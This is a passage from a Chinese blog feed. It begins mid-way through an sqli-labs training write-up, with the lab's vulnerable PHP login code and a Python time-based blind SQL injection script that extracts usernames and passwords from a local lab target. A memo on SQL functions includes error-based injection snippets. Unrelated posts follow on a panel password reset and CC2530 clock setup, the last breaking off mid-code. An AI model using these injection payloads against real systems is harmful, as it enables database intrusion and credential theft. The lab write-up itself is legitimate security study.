class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Try again looser";</span></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/wXnri1R6gxBjI87.png" alt=""></p><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a><strong>Less-</strong>16</h1><p>把Less-15脚本SQL语句中前面的” ‘ “换成” “) “即可</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><strong>Less-</strong>17</h1><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))<span class="comment">//检查是否为空</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);<span class="comment">//截取前面15个字符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())<span class="comment">//此方法当magic_quotes_gpc开启时所有的 ' (单引号)、" (双引号)、\（反斜杠）和 NULL字符都会被一个反斜杠自动转义。 但在php5.4起已经被放弃，始终返回false</span></span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);<span class="comment">//去除反斜杠</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))<span class="comment">//纯数字检测</span></span><br><span class="line">&#123;</span><br><span class="line">$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;<span class="comment">//mysql_real_escape_string对字符串中的特殊字符进行转义，会被进行转义的字符包括： NULL（ASCII 0），\n，\r，\，'，" 和 Control-Z. </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);<span class="comment">//获取变量的整数值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  <span class="comment">//uname被check_input了，详见上面的代码</span></span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'User Name:'</span>.$uname.<span class="string">"\n"</span>);</span><br><span class="line">fwrite($fp,<span class="string">'New Password:'</span>.$passwd.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo '&lt;font color= "#0000ff"&gt;';</span></span><br><span class="line">$row1 = $row[<span class="string">'username'</span>];  </span><br><span class="line"><span class="comment">//echo 'Your Login name:'. $row1;</span></span><br><span class="line">$update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line">mysql_query($update);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (mysql_error())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line"><span class="comment">//echo " You password has been successfully updated " ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag1.jpg"   /&gt;'</span>;</span><br><span class="line"><span class="comment">//echo 'Your Password:' .$row['password'];</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="4.5" color="#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//echo "Bug off you Silly Dumb hacker";</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg"   /&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*."</span></span><br><span class="line">url = <span class="string">"http://192.168.184.1:801/sqli/Less-17/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="comment">#1' where username='admin' and if(mid((select database()),1,1)= 's',sleep(3),1)#</span></span><br><span class="line">        <span class="comment">#1' where username='admin' and if(mid((select  database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span></span><br><span class="line">        <span class="comment">#1' where username='admin' and if(mid((select group_concat(table_name,'') from information_schema.tables where table_schema=database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span></span><br><span class="line">        <span class="comment">#1' where username='admin' and if(mid((select group_concat(column_name,'') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span></span><br><span class="line">        <span class="comment">#1' where username='admin' and if(substr((select * from (select GROUP_CONCAT(BINARY(username),',',BINARY(password)) from users) as temp),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span></span><br><span class="line">        flag = <span class="string">"1' where username='admin' and if(substr((select * from (select GROUP_CONCAT(BINARY(username),',',BINARY(password)) from users) as temp),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"uname"</span>:<span class="string">"admin"</span>,<span class="string">"passwd"</span>:flag,<span class="string">"submit"</span>:<span class="string">"submit"</span>&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print("&#123;&#125;".format(r.status_code))</span></span><br><span class="line">        <span class="keyword">if</span> r.elapsed.total_seconds()&gt;<span class="number">2</span>:</span><br><span class="line">            print(j,end = <span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>加上<code>where username=&#39;admin&#39;</code>是为了减少爆破时间，因为在改<code>password</code>的时候就只会改<code>admin</code>的<code>password</code>了，如果不加上亦可，不加上的话会将所有的<code>password</code>都改为<code>1</code>，但也达到了目的，在最后爆破字段的时候采用了一个虚表<code>temp</code>，因为<code>update</code>操作和<code>select</code>操作都作用于一张表，且会报错：<code>Table &#39;test&#39; is specified twice, both as a target for &#39;UPDATE&#39; and as a separate source for data</code>所以采用虚表进行盲注，且使用了<code>BINARY</code>函数来区分表中内容的大小写</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次有惊无险！！！</title>
      <link href="/2020/01/21/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%9C%89%E6%83%8A%E6%97%A0%E9%99%A9%EF%BC%81%EF%BC%81%EF%BC%81/"/>
      <url>/2020/01/21/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%9C%89%E6%83%8A%E6%97%A0%E9%99%A9%EF%BC%81%EF%BC%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>莫名其妙的phpmyadmin就进不去了，一直密码错误，在bt里面改密码也进不去，搞的后来差一点删除数据库</p><p>解决方法：</p><p>修改数据库密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /www/server/panel &amp;&amp; python tools.pyc root xxx</span><br></pre></td></tr></table></figure><p>修改bt面板的密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /www/server/panel &amp;&amp; python tools.pyc panel xxx</span><br></pre></td></tr></table></figure><p>xxx处写修改你的数据库密码或bt密码</p><p>注意，修改完密码后访问wp博客会显示数据库连接错误，这时在wp-config.php中修改你的MySQL数据库密码就行啦！</p><p>附上参考原文<a href="https://www.xqblog.com/12973.html" target="_blank" rel="noopener">链接</a></p><p>感谢！</p><p><img src="https://i.loli.net/2020/03/26/zd6mBqD3RFpbUsQ.jpg" alt="55667523_p0_master1200.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SQL中的一些函数（备忘）</title>
      <link href="/2020/01/17/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/"/>
      <url>/2020/01/17/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a><strong>SQL Server</strong></h1><h2 id="STUFF-character-expression-start-length-character-expression"><a href="#STUFF-character-expression-start-length-character-expression" class="headerlink" title="STUFF ( character_expression , start , length ,character_expression )"></a><strong>STUFF ( character_expression , start , length ,character_expression )</strong></h2><p>character_expression：一个字符数据表达式，可以是常量，变量，也可以是字符列或二级制数据列</p><p>start：一个重整数值，指定要删除和插入的开始位置，如果start或length为负，则返回空字符串。如果start比第一个character_expression长，则返回空字符串。start可以是big int型。</p><p>length：一个整数，指定要删除的字符串。如果length比第一个character_expression长，则最多删除到最后一个character_expression中的最后一个字符。length可以是big int类型。</p><p>返回类型：如果character_expression是受支持的字符数据类型，则返回字符数据。如果character_expression是一个受支持的binary数据类型，则返回二进制数据。</p><p>例如：</p><p>以下示例在第一个字符串 abcdef 中删除从第 2 个位置（字符 b）开始的三个字符，然后在删除的起始位置插入第二个字符串，从而创建并返回一个字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">STUFF</span>(<span class="string">'abcdef'</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">'ijklmn'</span>);</span><br><span class="line">结果：aijklmnef</span><br></pre></td></tr></table></figure><h2 id="FOR-XML-PATH-‘’"><a href="#FOR-XML-PATH-‘’" class="headerlink" title="FOR XML PATH(‘’)"></a><strong>FOR XML PATH(‘’)</strong></h2><p>通常与stuff函数结合起来使用， 将查询结果集以<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fromtitle=xml&fromid=86251&fr=aladdin" target="_blank" rel="noopener">XML</a>形式展现</p><p>现有表</p><p><img src="https://i.loli.net/2020/03/26/Yk6cAE1UL5Ffmbv.png" alt="image-107.png"></p><p>执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">stuff</span>((<span class="keyword">select</span> <span class="string">','</span>+test_name+test_pass <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">for</span> <span class="keyword">xml</span> <span class="keyword">path</span>(<span class="string">'root'</span>)),<span class="number">1</span>,<span class="number">1</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/maTwGxQHfDVW7F5.png" alt="image-108.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">stuff</span>((<span class="keyword">select</span> <span class="string">','</span>+test_name+test_pass <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">for</span> <span class="keyword">xml</span> <span class="keyword">path</span>(<span class="string">''</span>)),<span class="number">1</span>,<span class="number">1</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/WYqSPABecmgJvGy.png" alt="image-109.png"></p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><strong>MySQL</strong></h1><h2 id="Concat-str1-str2-…"><a href="#Concat-str1-str2-…" class="headerlink" title="Concat( str1,str2,… )"></a><strong>Concat( str1,str2,… )</strong></h2><p>返回结果为连续参数产生的字符串。如果任何一个参数为NULL，则返回值为NULL。</p><p><img src="https://i.loli.net/2020/03/26/G6HyAqlKioakU1n.png" alt="image-138.png"></p><h2 id="Concat-ws-separator-str1-str2-…"><a href="#Concat-ws-separator-str1-str2-…" class="headerlink" title="Concat_ws(separator,str1,str2,…)"></a><strong>Concat_ws(separator,str1,str2,…)</strong></h2><p>concat_ws()代表concat with separator ，是concat的特殊形式。第一个参数是其它参数的分隔符，如果分隔符为NULL，则结果为NULL</p><p>函数返回结果为连接参数产生的字符串</p><p><img src="https://i.loli.net/2020/03/26/U8ApuLMnX1Vayts.png" alt="image-139.png"></p><h2 id="Group-concat"><a href="#Group-concat" class="headerlink" title="Group_concat()"></a>Group_concat()</h2><p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])</p><p>将同一个分组中的值连接起来，返回一个字符串结果。</p><p>通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p><p><img src="https://i.loli.net/2020/03/26/iw26TDL4XzZcxkN.png" alt="image-20200203144159549.png"></p><h2 id="Updatexml-XML-document-XPath-string-new-value"><a href="#Updatexml-XML-document-XPath-string-new-value" class="headerlink" title="Updatexml (XML_document, XPath_string, new_value)"></a><strong>Updatexml (XML_document, XPath_string, new_value)</strong></h2><ul><li>XML_document：String格式，为XML文档对象的名称</li><li>XPath_string：XPath格式的字符串</li><li>new_value：String格式，替换查找到的符合条件的数据</li></ul><p>SQL注入通常用于显错注入；XPath_string出参数错误报错，得到信息，方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(1,(SELECT database())),1);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/tSkErsdx7wme5pH.png" alt="image-141.png"></p><h2 id="Extractvalue-XML-document-XPath-string"><a href="#Extractvalue-XML-document-XPath-string" class="headerlink" title="Extractvalue (XML_document, XPath_string)"></a><strong>Extractvalue (XML_document, XPath_string)</strong></h2><ul><li><p>XML_document：String格式，为XML文档对象的名称</p></li><li><p>XPath_string：Xpath格式的字符串</p><p>extractvalue(1,concat(1,database()));</p></li></ul><p><img src="https://i.loli.net/2020/03/26/VTlharikYuJGUbI.png" alt="image-142.png"></p><h2 id="Left-ARG-LENGTH-、Right-ARG-LENGTH"><a href="#Left-ARG-LENGTH-、Right-ARG-LENGTH" class="headerlink" title="Left(ARG,LENGTH)、Right(ARG,LENGTH)"></a><strong>Left(ARG,LENGTH)、Right(ARG,LENGTH)</strong></h2><p>此函数返回ARG最左边，右边的LENGTH个字符串，ARG可是char或binary，string</p><p><img src="https://i.loli.net/2020/03/26/974o3IPca8wExvr.png" alt="image-143.png"></p><h2 id="Substr-stirng-strat-length"><a href="#Substr-stirng-strat-length" class="headerlink" title="Substr(stirng,strat,length)"></a><strong>Substr(stirng,strat,length)</strong></h2><ul><li>string：需要截取的字符串</li><li>start：开始截取的位置</li><li>length：需要截取字符串的个数，若无此项，则从截取位置一直截取到最后</li></ul><p><img src="https://i.loli.net/2020/03/26/PpfLyAzUgM4Huls.png" alt="image-152.png"></p><h2 id="Ascii-str"><a href="#Ascii-str" class="headerlink" title="Ascii(str)"></a><strong>Ascii(str)</strong></h2><p>返回字符串str的最左字符的数值。返回0，如果str为空字符串。返回NULL，如果str为NULL。 ASCII()返回数值是从0到255。</p><p><img src="https://i.loli.net/2020/03/26/qVHkE3IsLg6mYux.png" alt="image-166.png"></p><h2 id="Pow-x-y"><a href="#Pow-x-y" class="headerlink" title="Pow(x,y)"></a>Pow(x,y)</h2><p>pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错</p><p><img src="https://i.loli.net/2020/03/26/dFDIkC75anAwVWf.png" alt="image-20200203151717577.png"></p><h2 id="MID-column-name-start-length"><a href="#MID-column-name-start-length" class="headerlink" title="MID(column_name,start[,length])"></a>MID(column_name,start[,length])</h2><p><img src="https://i.loli.net/2020/03/26/xTWc64pjmuRQ7Os.png" alt="image-20200224203301659.png"></p><p><img src="https://i.loli.net/2020/03/26/XE5Nab7z4Alg3DL.png" alt="image-20200224204817021.png"></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时钟，串口配置</title>
      <link href="/2020/01/15/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/01/15/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="切换系统高频时钟源"><a href="#切换系统高频时钟源" class="headerlink" title="切换系统高频时钟源"></a>切换系统高频时钟源</h1><p>CC2530在正常运行的时候需要一个高频时钟信号和一个低频的时钟信号</p><ul><li>高频时钟信号：主要供给给CPU，保证程序的运行</li><li>低频时钟信号：主要供给看门狗，睡眠定时器等偏上外设</li></ul><p>时钟信号来源</p><ul><li>高频信号两个来源：芯片内部的16M RC电路；外接的32M石英晶振</li><li>低频信号两个来源：芯片内部的32K RC电路，外接的32.768K石英晶振</li></ul><p>CC2530默认上电的时候，是内部的2个RC电路作为高频和低频的时钟来源</p><p>如果我们在用串口，特别是无线通信的时候，必须要用32M的石英晶振作为高频时钟来源，16M比32M的速度慢，为32M的1/2</p><p>高频时钟源特点：</p><ul><li>两个高频时钟源可以同时起振产生高频时钟信号</li><li>而两个低频时钟源，某一时刻只能有1个起振，并且起振能的这个时钟源供给CC2530</li></ul><p>切换步骤：</p><p>1、2个高频时钟源起振； 让SLEEPCMD的第2位为0；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLEEPCMD &amp;=<span class="number">0xFB</span>;<span class="comment">//1111 1011 开启2个高频时钟源</span></span><br></pre></td></tr></table></figure><p>2、待目标时钟源振荡稳定；SLEEPSTA寄存器的第6位为1表示32 时钟源稳定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));<span class="comment">// 0100 0000 等待32M稳定</span></span><br></pre></td></tr></table></figure><p>3、 延时一小段时间63us（不定）； 超过63微秒延时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delayus</span><span class="params">()</span><span class="comment">//调用函数实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> k=<span class="number">63</span>;</span><br><span class="line">    <span class="keyword">while</span>(k--);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、不分频输出； 把寄存器CLKCONCMD的低3位 设置为000，表示不分频输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLKCONCMD &amp;=<span class="number">0xF8</span>;<span class="comment">//1111 1000 不分频输出</span></span><br></pre></td></tr></table></figure><p>5、 选中目标高频时钟源作为系统主时钟； 把寄存器CLKCONCMD的第6位 清0，设置32M作为系统主时钟</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLKCONCMD &amp;=<span class="number">0XBF</span>;<span class="comment">//1011 1111 设置32M作为系统主时钟</span></span><br></pre></td></tr></table></figure><p>6、确认一下当前工作的系统时钟是不是所选的高频时钟；如果读CLKCONSTA这个寄存器的第6位为0，表示32M的时钟源已经作为了当前的系统主时钟，程序可以往下运行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(CLKCONSTA &amp; <span class="number">0x40</span>); <span class="comment">//0100 0000 等待32M成功成为当前系统主时钟</span></span><br></pre></td></tr></table></figure><h1 id="数码管测试"><a href="#数码管测试" class="headerlink" title="数码管测试"></a>数码管测试</h1><p>32M代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delayus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> k=<span class="number">63</span>;</span><br><span class="line">    <span class="keyword">while</span>(k--);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">       <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">800</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init32M</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   SLEEPCMD &amp;=<span class="number">0xFB</span>;<span class="comment">//1111 1011 开启2个高频时钟源</span></span><br><span class="line">   <span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));<span class="comment">// 0100 0000 等待32M稳定</span></span><br><span class="line">   delayus();</span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0xF8</span>;<span class="comment">//1111 1000 不分频输出</span></span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0XBF</span>;<span class="comment">//1011 1111 设置32M作为系统主时钟</span></span><br><span class="line">   <span class="keyword">while</span>(CLKCONSTA &amp; <span class="number">0x40</span>); <span class="comment">//0100 0000 等待32M成功成为当前系统主时钟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> i;</span><br><span class="line">     LS164_Cfg();</span><br><span class="line">     Init32M();</span><br><span class="line">     <span class="keyword">while</span>(<span 